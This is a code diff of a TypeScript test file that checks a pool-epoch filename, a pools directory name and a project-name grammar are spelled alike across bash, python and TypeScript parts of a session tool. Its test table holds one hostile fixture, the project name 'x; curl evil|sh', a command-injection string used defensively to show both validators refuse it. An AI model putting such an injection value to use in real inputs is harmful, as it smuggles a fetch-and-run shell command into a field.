@@ -1,16 +1,20 @@
 // The pool vocabulary is spelled once per LANGUAGE and the spellings are held
 // equal HERE, because they cannot be held equal structurally: `ccd/ccd` sources
 // nothing from this repository, and `ccd/ccrc-doctor-checks` is sourced under
-// `set -u` by things that are not `ccrc` (`ccrc-doctor.test.ts`'s `tableNames()`
+// `set -u` by things that are not `ccrc` (`ccrc-doctorFixture.ts`'s `tableNames()`
 // does exactly that), so neither can import a TypeScript constant. This is the
 // `CCRC_RC_FILE` mechanism from `single-definition.test.ts`, applied to the
 // values the pool design puts in more than one language: the NAME GRAMMAR
 // (three spellings — TypeScript, `ccd/ccd`, `ccrc-doctor-checks`), the
 // DIRECTORY NAME (three as well, and the third of those was pinned by nothing
 // until the fourth describe below was written; see its own header), the
-// PROJECT-NAME grammar the doctor filters its printed command by, and — fix
-// round 7 — the READ CAP, which is two spellings of one number and was pinned
-// by nothing at all: `ccrc-doctor.test.ts` can only bound it to a range.
+// PROJECT-NAME grammar the doctor filters its printed command by, the READ CAP
+// (fix round 7, two spellings of one number, pinned by nothing at all until
+// this file's last describe — the `ccrc-doctor-*` test files can only bound it to a
+// range), and — item 17, final fix round — the PROJECTION FILENAME
+// (`pool-epoch`, `POOL_EPOCH_FILE_NAME`), five spellings across three
+// languages and the two TypeScript readers that were the last of them to gain
+// one, pinned in the describes below the DIRECTORY NAME ones.
 //
 // The precedent this improves on is `ccd/ccrc-wrapper-shape:67`, which holds a
 // hand-written bash copy of `shared/roster.ts`'s `ID_RE` and discloses that
@@ -26,18 +30,19 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { POOL_NAME_RE } from '../../shared/roster.js';
+import { POOL_EPOCH_FILE_NAME } from '../../shared/agent-protocol.js';
 import { POOLS_DIR_NAME } from '../src/pools.js';
-import { CCD, makeCcdHarness } from './ccdWsHelpers.js';
+import { CCD, makeCcdHarness, ccdSource } from './ccdWsHelpers.js';
 import { mkTmp } from './tmpHelpers.js';
 
 const here = path.dirname(fileURLToPath(import.meta.url));
 const ccrcRoot = path.resolve(here, '..', '..');
-const ccdSrc = readFileSync(CCD, 'utf8');
+const ccdSrc = ccdSource();
 /** bash's absolute path, resolved ONCE under this process's real PATH. The one
  *  run below hands its child an EMPTY PATH — `_check_pools` forks nothing, and
  *  an empty PATH is the strongest statement of that — and libuv resolves the
  *  executable against the CHILD's environment, so a bare `bash` would be
- *  ENOENT. `ccrc-doctor.test.ts:70` resolves it the same way for the same
+ *  ENOENT. `ccrc-doctorFixture.ts's `BASH`` resolves it the same way for the same
  *  reason. */
 const BASH = spawnSync('bash', ['-c', 'command -v bash'], { encoding: 'utf8' }).stdout.trim();
 
@@ -131,18 +136,40 @@ describe('the pools directory has a THIRD spelling, and it is pinned too', () =>
   // the directory that constant names, which no text scan can show.
   const checks = readFileSync(path.join(ccrcRoot, 'ccd', 'ccrc-doctor-checks'), 'utf8');
 
-  it('ccd/ccrc-doctor-checks names .cc-sessions/<dir> exactly once, and <dir> is POOLS_DIR_NAME', () => {
+  it('ccd/ccrc-doctor-checks names .cc-sessions/<dir> exactly twice, and the two are POOLS_DIR_NAME and POOL_EPOCH_FILE_NAME, nothing else', () => {
     // Comment lines are excluded: this file's prose names the path in its own
-    // header, and a comment cannot make the check read anywhere.
+    // header, and a comment cannot make either check read anywhere.
+    //
+    // Item 17 (final fix round): `_check_pool-sync` (added earlier in this
+    // same fix round) opens with its own literal `$HOME/.cc-sessions/pool-epoch`
+    // — a SECOND `.cc-sessions/<segment>` literal this describe's original
+    // "exactly one" count did not anticipate. Widening the count to "exactly
+    // two" without checking WHICH two would be the exact relaxation the brief
+    // that wrote this describe forbids (a bare count re-accepts an unpinned
+    // literal), so this reworked version keeps the same shape the DIRECTORY
+    // NAME pin above already uses: every hit must be one of the two
+    // individually-pinned constants, both must appear, and a third —
+    // whatever segment it names — still reds here, as does either of the two
+    // known ones being spelled wrong or duplicated in place of the other.
     const hits = checks.split('\n')
       .filter((l) => !/^\s*#/.test(l))
       .flatMap((l) => [...l.matchAll(/\.cc-sessions\/([A-Za-z0-9._-]+)/g)].map((m) => m[1]!));
-    expect(hits.length, `expected exactly one .cc-sessions/<dir> literal, found ${hits.length}: ${hits.join(', ')}`).toBe(1);
-    expect(hits[0]).toBe(POOLS_DIR_NAME);
+    expect(hits.length, `expected exactly two .cc-sessions/<dir> literals, found ${hits.length}: ${hits.join(', ')}`).toBe(2);
+    const known = new Set([POOLS_DIR_NAME, POOL_EPOCH_FILE_NAME]);
+    // Guards the guard: if the two constants ever collided, the set-equality
+    // check below would pass on a single repeated hit instead of one of each.
+    expect(known.size, 'POOLS_DIR_NAME and POOL_EPOCH_FILE_NAME must not be the same string').toBe(2);
+    for (const h of hits) {
+      expect(known.has(h),
+        `${h} is not one of the two individually-pinned names (POOLS_DIR_NAME=${POOLS_DIR_NAME}, POOL_EPOCH_FILE_NAME=${POOL_EPOCH_FILE_NAME})`,
+      ).toBe(true);
+    }
+    // Both must be present — not the same one twice standing in for the other.
+    expect(new Set(hits)).toEqual(known);
   });
 
   it('the doctor check READS the directory POOLS_DIR_NAME names', () => {
-    // Sourced standalone under `set -u`, the way `ccrc-doctor.test.ts`'s own
+    // Sourced standalone under `set -u`, the way `ccrc-doctorFixture.ts`'s own
     // `tableNames()` does it — `_check_pools` forks nothing, so this needs no
     // stub binaries and no PATH beyond bash's own.
     const home = mkTmp('ccrc-pools-doctor-parity-');
@@ -162,6 +189,67 @@ describe('the pools directory has a THIRD spelling, and it is pinned too', () =>
     } finally {
       fs.rmSync(home, { recursive: true, force: true });
     }
+  });
+});
+
+// ── the FOURTH value this file holds equal: the pool-epoch FILENAME ────────
+// Item 17 (final fix round). The doctor's own literal is pinned above, as one
+// of the two names the previous describe enumerates; this describe pins the
+// other two files the brief names — the WRITER (`ccd/ccd-pool-sync`, bash and
+// python) and the placement READER (`ccd/ccd`, `_acct_pool_state`) — the same
+// way the NAME GRAMMAR and DIRECTORY NAME describes above pin theirs.
+//
+// THE WRITER MATTERS MOST. A rename at the publish site alone leaves every
+// reader — `ccd`, the doctor, both TypeScript sides — looking for the OLD
+// name forever: `_acct_pool_state` answers `unreadable` for every account,
+// which routes to undecidable -> refuse for every tagged project, silently,
+// with no red anywhere else. Fail-shut, so not dangerous, but the whole
+// feature stops. So the WRITER's own pin checks two things, not one: that its
+// several literal spellings of the filename agree with EACH OTHER (an
+// internal split — the publish call renamed, the pre-write guard not — would
+// be its own silent defect, invisible to a pin that only checked the publish
+// call against the constant), and that they agree with `POOL_EPOCH_FILE_NAME`.
+describe('the pool-epoch projection filename is one name across the writer, the placement reader, and the doctor', () => {
+  const CCD_POOL_SYNC = path.join(ccrcRoot, 'ccd', 'ccd-pool-sync');
+  const poolSyncSrc = readFileSync(CCD_POOL_SYNC, 'utf8');
+
+  it('ccd/ccd-pool-sync (the WRITER, bash + python) spells the filename the same way everywhere, and it is POOL_EPOCH_FILE_NAME', () => {
+    // Every literal reference to the projection's filename in this file — the
+    // tmp-file basename (`.pool-epoch.$$.tmp`), the pre-write directory guard
+    // (`-L`/`-d` on `$REG/pool-epoch`), its own error string, and the
+    // `os.rename()` target that actually publishes it — is matched here.
+    // This file holds no bash variable for the name the way `ccd/ccd` does
+    // for `POOLS_DIR`, so a rename touching fewer than all of these sites is
+    // possible and would be silent without this scan.
+    const hits = [...poolSyncSrc.matchAll(/\$REG\/\.?([A-Za-z][A-Za-z0-9-]*)(?:\.\$\$\.tmp)?"/g)].map((m) => m[1]!);
+    expect(hits.length, `expected 5 pool-epoch filename literals in ccd-pool-sync, found ${hits.length}: ${hits.join(', ')}`).toBe(5);
+    expect(new Set(hits).size,
+      `ccd-pool-sync spells the projection filename more than one way: ${[...new Set(hits)].join(', ')}`,
+    ).toBe(1);
+    expect(hits[0]).toBe(POOL_EPOCH_FILE_NAME);
+    // The publish call itself, matched explicitly rather than trusted to be
+    // among the five above: this `os.rename()` line is the one that actually
+    // determines the file's real name on disk, so it is the site the brief
+    // calls out as mattering most, pinned on its own rather than folded into
+    // the broader scan by coincidence of shape.
+    const target = /os\.rename\(sys\.argv\[1\], sys\.argv\[2\]\)'\s+"\$tmp"\s+"\$REG\/([A-Za-z0-9._-]+)"/.exec(poolSyncSrc)?.[1];
+    expect(target, 'could not find the os.rename() publish call in ccd/ccd-pool-sync').toBeTruthy();
+    expect(target).toBe(POOL_EPOCH_FILE_NAME);
+  });
+
+  it('ccd/ccd holds exactly one placement-reader spelling (f="$REG/<name>"), byte-equal to POOL_EPOCH_FILE_NAME', () => {
+    // `_acct_pool_state` binds its read path once, `f="$REG/pool-epoch"`
+    // (unlike `POOLS_DIR`, this is not a top-level `NAME=` assignment but one
+    // field of a multi-variable `local` line, so `exactlyOne`'s NAME=-shaped
+    // helper does not apply — this scan is narrower on purpose). The pattern
+    // requires the segment right after `$REG/` to run straight to a closing
+    // quote with no further `/` or `$` in it, which is what naturally excludes
+    // every OTHER `f="$REG/...` assignment in this file (`$1`-suffixed ids,
+    // `.reaped/$1.json`, `usage/sweep/latest.json` — none of them match this
+    // shape), rather than needing a hand-maintained exclude list.
+    const hits = [...ccdSrc.matchAll(/\bf="\$REG\/([A-Za-z0-9._-]+)"/g)].map((m) => m[1]!);
+    expect(hits.length, `expected exactly one f="$REG/<name>" literal in ccd/ccd, found ${hits.length}: ${hits.join(', ')}`).toBe(1);
+    expect(hits[0]).toBe(POOL_EPOCH_FILE_NAME);
   });
 });
 
@@ -190,15 +278,18 @@ describe('the VERB writes where POOLS_DIR_NAME says, on a real box', () => {
 // FILENAME read off the box's own disk. Fix round 7 filters it, and the
 // comment beside that filter makes a CROSS-FILE claim in prose:
 //
-//   "The charset is `_ws_project_valid`'s own … The charset is shared; the
-//    leading-dash rule is this file's alone, and the parity test pins both
-//    halves rather than trusting this sentence."
+//   "The charset is `_ws_project_valid`'s own (grep `_ws_project_valid`,
+//    `^[A-Za-z0-9._-]+$`, no dot- or dash-leading), so no name `ccd` would
+//    ever CREATE is omitted — a cross-file claim, and
+//    `pool-name-parity.test.ts` measures it rather than trusting this
+//    sentence."
 //
 // This is that measurement, and the sentence sends the reader HERE, so a
 // describe that did not exist would make the disclosure itself false.
 //
-// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and once claimed
-// "no name `ccd` would ever CREATE is omitted". Both were wrong. The anchor
+// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and claimed "no name
+// `ccd` would ever CREATE is omitted" while `ccd` still created `-lead`. Both
+// were wrong then; path-identity W1b made the second true. The anchor
 // was wrong WHEN WRITTEN and then went further wrong as edits landed above
 // it — this file's own first correction of it named `ccd:3709`, which is
 // stale too, by exactly the mechanism it was describing. No pin was added
@@ -206,26 +297,28 @@ describe('the VERB writes where POOLS_DIR_NAME says, on a real box', () => {
 // every edit above it. The anchor is now a `grep` for the function's own
 // name, in both files, which cannot go stale without the name going with it.)
 //
-// WHAT THE MEASUREMENT FOUND IS NOT WHAT THE OLD SENTENCE
-// SAID. The two filters agree on eight of the nine names below and disagree
-// on the ninth: `-lead` is a name `ccd` DOES create — `_ws_project_valid`
-// accepts it (`-` is in the charset, and only a leading DOT is refused), and
-// `cmd_project_pool --project -lead --pool <p>` really writes the tag, both
-// measured below — and the doctor omits it anyway. The second half of the
-// same comment says so out loud ("A leading `-` is refused too: it is
-// shell-safe but would be read by `ccd` as a flag"), so the filter is
-// deliberate, not a drift; it is the summary clause that overstates.
+// WHAT THE MEASUREMENT FINDS NOW (path-identity spec §2.4). Until path-identity
+// W1b the two filters disagreed on one of the nine names below. `-lead` was a
+// name `ccd` DID create: `_ws_project_valid` refused only a leading DOT, and
+// `cmd_project_pool --project -lead --pool <p>` really wrote the tag. The
+// doctor omitted it anyway. A dash-leading project is how `ccd` could mint an
+// id spelled as a flag (project `-` with slug `actor` is `--actor`), so
+// `_ws_project_valid` gained its own leading-dash line, SEPARATE from the
+// charset line and the dot line, and the doctor's summary clause became true
+// as written. Both halves are measured below: the table, and `ccd` refusing
+// the tag.
 //
-// So the property pinned here is the TRUE one, and it is the one worth
-// having: the doctor's filter is a SUBSET of `ccd`'s grammar. Every name it
-// keeps is a name `ccd` would create, which is the safety direction — a
-// remedy never prints a command for a name that could not be a project — and
-// the only names it drops that `ccd` would keep are the leading-dash ones,
-// which is exactly the `-*` arm. That second half is measured over the nine
-// names below and no further — see that assertion's own note on what a table
-// of nine does and does not establish. A charset that drifted in either file
-// breaks the first half, in whichever direction it drifted.
-describe('the project-name grammar is one grammar in two files (and the doctor is stricter by exactly one arm)', () => {
+// So two properties are pinned here. First, the doctor's filter is a SUBSET of
+// `ccd`'s grammar. Every name it keeps is a name `ccd` would create, which is
+// the safety direction: a remedy never prints a command for a name that could
+// not be a project. Second, over the nine names below the two filters AGREE. A
+// leading-dash line dropped from `ccd` brings `-lead` back as the one
+// disagreement, which reds here even though the subset property stays green.
+// That second half is measured over the nine names below and no further; see
+// that assertion's own note on what a table of nine does and does not
+// establish. A charset that drifted in either file breaks the first half, in
+// whichever direction it drifted.
+describe('the project-name grammar is one grammar in two files (and both refuse a leading dash, path-identity spec §2.4)', () => {
   // Resolved once each rather than at each use, so the two shipped files
   // this describe reads have one name apiece — the same reason `ccdSrc`
   // above has one.
@@ -314,6 +407,14 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
     expect(omitPattern().split('|')).toContain('.*');
   });
 
+  it('ccd refuses a dash-leading name on a line of its own (path-identity spec §2.4)', () => {
+    // SEPARATE, as the dot rule is. Folded into the charset line, the charset
+    // read above stops matching. Folded into the dot line, a reader loses
+    // which rule refused. The doctor's `-*` arm is pinned by the whole-list
+    // case below.
+    expect(ccdValidFn()).toContain('[[ "$1" != -* ]] || return 1');
+  });
+
   it('the doctor omits the empty name and the leading-dash names too, and only those', () => {
     // The arm is a fixed list, so pin the WHOLE list rather than its members
     // one at a time: a fifth pattern appearing here is a widening of what the
@@ -360,8 +461,9 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
   };
 
   it('the two filters, run for real, answer this exact table', () => {
-    // Measured, name by name, against the shipped bytes of both files. The
-    // one row that is not agreement is `-lead`, and it is written out here
+    // Measured, name by name, against the shipped bytes of both files. Every
+    // row is agreement. `-lead` was the one disagreement until path-identity
+    // W1b gave `_ws_project_valid` its dash line, and it is written out here
     // rather than excused in prose, so a change to EITHER file that moved it
     // — in either direction — is a red line an author has to look at.
     const rows = measurePair();
@@ -371,7 +473,7 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
       'a_b': 'accept keep',
       'a-b': 'accept keep',
       '.hidden': 'refuse omit',
-      '-lead': 'accept omit',
+      '-lead': 'refuse omit',
       'x; curl evil|sh': 'refuse omit',
       'x y': 'refuse omit',
       '': 'refuse omit',
@@ -391,50 +493,63 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
     expect(NAMES.filter((_, i) => rows[i]!.endsWith(' keep')).length).toBeGreaterThan(0);
   });
 
-  it('the only names they disagree on are the leading-dash ones', () => {
-    // The exact size of the gap the summary clause in `_check_pools` glosses
-    // over. A charset edit that made them disagree on one of these nine reds
-    // here and names it — and it reds where the subset property above stays
+  it('the two filters now disagree on none of the nine names', () => {
+    // The exact size of the gap, which path-identity W1b closed: `ccd` and the
+    // doctor both refuse a leading dash now. A charset edit, or a dash arm
+    // dropped from either file, that made them disagree on one of these nine
+    // reds here and names it. It reds where the subset property above stays
     // GREEN, because that property is one-directional: a doctor getting
     // STRICTER cannot print a command it should not have, so it is safe and
     // invisible there, and this is the assertion that sees it.
     //
     // WHAT THIS DOES NOT ESTABLISH: nine names are a table, not a proof over
     // every string. It shows the two filters agreeing where the design says
-    // they must and disagreeing only where the `-*` arm says they will; it
-    // cannot show there is no third disagreement nobody thought to write
-    // down. The charset equality above is the part that generalises.
+    // they must; it cannot show there is no disagreement nobody thought to
+    // write down. The charset equality above is the part that generalises.
     const rows = measurePair();
     const disagree = NAMES.filter((_, i) => rows[i] === 'accept omit' || rows[i] === 'refuse keep');
-    expect(disagree).toEqual(['-lead']);
-    expect(disagree.every((n) => n.startsWith('-'))).toBe(true);
+    expect(disagree).toEqual([]);
+    // Guards the guard: `toEqual([])` over a table that measured nothing would pass. Five names are
+    // refused by ccd and omitted by the doctor, `-lead` among them.
+    expect(NAMES.filter((_, i) => rows[i] === 'refuse omit')).toEqual(['.hidden', '-lead', 'x; curl evil|sh', 'x y', '']);
   });
 
   // ── the two ENDS of the claim, on real files ──────────────────────────
-  // Everything above runs the two filters in isolation. These two prove the
-  // filters are the ones the shipped tools actually use — that `-lead` is a
-  // tag `ccd` will really create, and that `_check_pools` really keeps it and
-  // the hostile name out of the printed command.
-  it('ccd really creates a tag whose name the doctor will omit', () => {
-    // Without this, "`-lead` is a name ccd would create" is a claim about a
-    // function nobody proved is reached. `cmd_project_pool`'s arity `case`
-    // binds `project=$2` positionally, so a leading dash is never read as a
-    // flag on the way in — measured here, not reasoned about.
+  // Everything above runs the two filters in isolation. These prove the
+  // filters are the ones the shipped tools actually use: `ccd` really refuses
+  // `-lead` and the hostile name, and `_check_pools` really keeps both out of
+  // the printed command.
+  it('ccd refuses to create a tag whose name the doctor would omit', () => {
+    // Without this, "ccd refuses `-lead`" is a claim about a function nobody
+    // proved is reached. `cmd_project_pool`'s arity `case` binds `project=$2`
+    // positionally, so a leading dash is never read as a flag on the way in.
+    // The refusal is `_ws_project_valid`'s dash line, measured here, not
+    // reasoned about (path-identity spec §2.4).
     const h = makeCcdHarness('ccrc-pool-dash-');
     try {
       fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
-      expect(h.sh('cmd_project_pool --project -lead --pool pool-a')).toBe('tagged -lead pool-a');
-      const p = path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead');
-      expect(fs.readFileSync(p, 'utf8')).toBe('pool-a');
+      let stderr = '';
+      let threw = false;
+      try {
+        h.sh('cmd_project_pool --project -lead --pool pool-a');
+      } catch (err) {
+        threw = true;
+        stderr = String((err as { stderr?: string }).stderr ?? '');
+      }
+      expect(threw, 'cmd_project_pool tagged a dash-leading project').toBe(true);
+      expect(stderr).toContain("invalid project '-lead'");
+      // And nothing landed: the refusal is BEFORE the filesystem.
+      expect(fs.existsSync(path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead'))).toBe(false);
     } finally {
       h.cleanup();
     }
   });
 
   it('ccd really REFUSES the hostile name, so the gate is the running function and not the first copy of it', () => {
-    // The negative arm the positive one above cannot supply. A second,
+    // The charset's negative arm, beside the dash one above. A second,
     // looser `_ws_project_valid` appended to `ccd/ccd` in a spelling the
-    // scan misses would still create `-lead` happily — measured — so
+    // scan misses would still create names the shipped one refuses (it
+    // created `-lead` happily, measured before the dash line), so
     // "ccd would never create this name" needs a name the gate must REFUSE,
     // run against the shipped file. `x; curl evil|sh` is the doctor's own
     // hostile fixture below, closing the loop: the reason the remedy may
@@ -521,7 +636,7 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
 // nobody can otherwise inspect — an over-cap tag would read `malformed` in one
 // and legal in the other.
 //
-// `ccrc-doctor.test.ts` pins the doctor's cap only by BEHAVIOUR, and behaviour
+// the `ccrc-doctor-*` test files pins the doctor's cap only by BEHAVIOUR, and behaviour
 // bounds it to a range and no further: its 106-byte and 56-byte fixtures are
 // satisfied by any cap in [56, 105] (measured — an `-n 80` build keeps both
 // green). Its title used to say "applies the reader's 64-byte cap" and measured
